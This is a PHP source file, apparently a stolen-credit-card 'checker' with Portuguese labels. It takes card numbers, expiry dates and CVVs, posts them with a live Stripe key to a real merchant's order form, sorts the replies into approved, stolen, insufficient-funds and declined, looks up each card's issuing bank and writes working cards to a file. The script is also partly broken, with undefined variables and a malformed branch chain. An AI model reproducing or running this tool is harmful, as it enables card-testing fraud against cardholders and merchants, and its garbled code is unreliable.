<?php
error_reporting(1);
function value($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function Explicit_Extract($str, $tagIni, $tagEnd)
{
    $arr = explode($tagIni, $str);
    foreach ($arr as $k => $v) {
        $arr[$k] = substr($v, 0, strpos($v, $tagEnd));
    }
    if (empty($arr[0])) {
        unset($arr[0]);
    }
    return $arr[1];
}

function pregMatch($inicio, $final, $conteudo)
{
    preg_match('@' . $inicio . '(.*?)' . $final . '@si', $conteudo, $extract);
    return $extract[1];
}
function data($objeto)
{
    $objeto = explode('-', $objeto);
    $objeto = '' . $objeto[2] . '/' . $objeto[1] . '/' . $objeto[0] . '';
    return $objeto;
}
function percent($num_amount, $num_total)
{
    $count1 = $num_amount / $num_total;
    $count2 = $count1 * 100;
    $count  = number_format($count2, 0);
    return $count;
}
if ($_GET['testar'] == "cc") {
    $ccs       = $_GET['ccs'];
    $separador = $_GET['separador'];
    $id        = $_GET['id'];
    $explode   = explode($separador, $ccs);
    if (substr($explode[0], 0, 1) == '4') {
        $bander = '<font color="#0bbaee"><i class="fa fa-cc-visa" aria-hidden="true"></i></font>';
        $info = 'VISA';
    } elseif (substr($explode[0], 0, 1) == '5') {
        $bander = '<font color="#FF4500"><i class="fa fa-cc-mastercard" aria-hidden="true"></i>';
        $info = 'ECMC';
    } elseif (substr($explode[0], 0, 1) == '3') {
        $bander = '<font color="#137694"><i class="fa fa-cc-amex" aria-hidden="true"></i>';
        $info = 'AMEX';
    } else {
        $bander = '<font color="#ff0000"><i class="fa fa-cc" aria-hidden="true"></font>';
    }
    
    
    $ccn = $explode[0];
    $ccm = $explode[1];
    $ccy = $explode[2];
    $cvv = $explode[3];
    
    $random                = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 6)), 0, 6);
    $random_valor          = rand(1, 9);
    $random_valor_centavos = rand(10, 99);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.fiberfix.com/order-form-16681964");
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0");//user-agent
    curl_setopt($ch, CURLOPT_REFERER, "https://www.fiberfix.com/order-form-16681964");//REFERER
    $request_headers = array();
    $request_headers[] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';//accept
    curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    //curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Content-Type: application/x-www-form-urlencoded','Connection: Keep-Alive'));
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.juma.org%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=.$email.&card[address_line1]='.$street.'&card[address_city]='.$city.'[address_state]='.$state.'&card[address_zip]='.$zip.'&card[address_country]=United+States&time_on_page=56577&guid=NA&muid=d85205bf-86d0-445f-bf0b-def043abdc3b&sid=bdcb526c-bbd2-4577-b4ac-2423eb3d9b2b&key=pk_live_d3BYgyAGfv30IDKX1Vtr0zJz');
    $resultado = curl_exec($ch);
							
    if  (strpos($resultado, "Thank you for your donation") !== false) {
		$hnd = fopen("./aprovadas.txt", "a");
        $bin = substr($explode[0], 0, 6);
    $bin_item1 = file_get_contents('https://lookup.binlist.net/' . $bin . '&format=json');
    $bin_item = json_decode($bin_item1, true);
	
    
    $bank        = $bin_item->name == '' ? 'N/A' : $bin_item->name;
    $type        = $bin_item->type == '' ? 'N/A' : $bin_item->type;
    $level       = $bin_item->level == '' ? 'N/A' : $bin_item->level;
    $countrycode = $bin_item->countrycode == '' ? 'N/A' : $bin_item->countrycode;
	fwrite($hnd, "$ccn|$ccm|$ccy|$cvv\n");
        echo "<tr><td><font size='1'>$bander</font></td><td><font color='#1ABE88' size='1'>Aprovada</font></td><td><font size='1'>$ccn</font></td><td><font size='1'>$ccm</font></td><td><font size='1'>$ccy</font></td><td><font size='1'>$cvv</font></td><td><font></font><font color='#1ABE88' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'>$type $level | $bank | $countrycode</font></td></tr>";
    } elseif (strpos($resultado, 'You manual order is complete.') !== false) {
        echo "<tr><td><font size='1'>$bander</font></td><td><font color='#1ABE88' size='1'>Aprovada</font></td><td><font size='1'>$ccn</font></td><td><font size='1'>$ccm</font></td><td><font size='1'>$ccy</font></td><td><font size='1'>$cvv</font></td><td><font></font><font color='#1ABE88' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'>$type $level | $bank | $countrycode</font></td></tr>";
    } else {
        echo "<tr><td><font size='1'>$bander</font></td><td><font color='#DA514A' size='1'>Reprovada</font></td><td><font size='1'>$ccn</font></td><td><font size='1'>$ccm</font></td><td><font size='1'>$ccy</font></td><td><font size='1'>$cvv</font></td><td><font></font><font color='#DA514A' size='1'>R$: $random_valor,$random_valor_centavos</font></td><td><font size='1'>$type $level | $bank | $countrycode</font></td></tr";
        fclose($hnd);
    }
    echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESS CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 CAGE 👑★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-warning'>LOST CARD</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-warning'>STOLEN CARD</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=2 color='white'><font class='badge badge-light'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-light'>CCN MATCHED</i></font> <font class='badge badge-light'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ★ 👑 CAGE 👑★ ♛<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-light'>CCN MATCHED</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Viva<i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-warning'>STOLEN OR LOST</i></font> <font class='badge badge-green'>[Info: $type - $country]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i></font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>DO NOT HONOR</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result, 'Your card was declined.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD DECLINED</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CVC_CHECKED : Fail</i></font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>MISSING CARD DETAIL</i></font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CARD NOT CHECK</i></font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ CAGE ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ CAGE ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>3D SECURED</i></font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ CAGE ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i></font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ CAGE ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i></font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=2 color='white'><font class='badge badge-warning'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'fraudulent')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ★ CAGE ★ ♛<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Fraudulent</i></font><br>";
} 
else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Died<i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Server Failure/Error Not Listed</i></font><br>";
}

?> 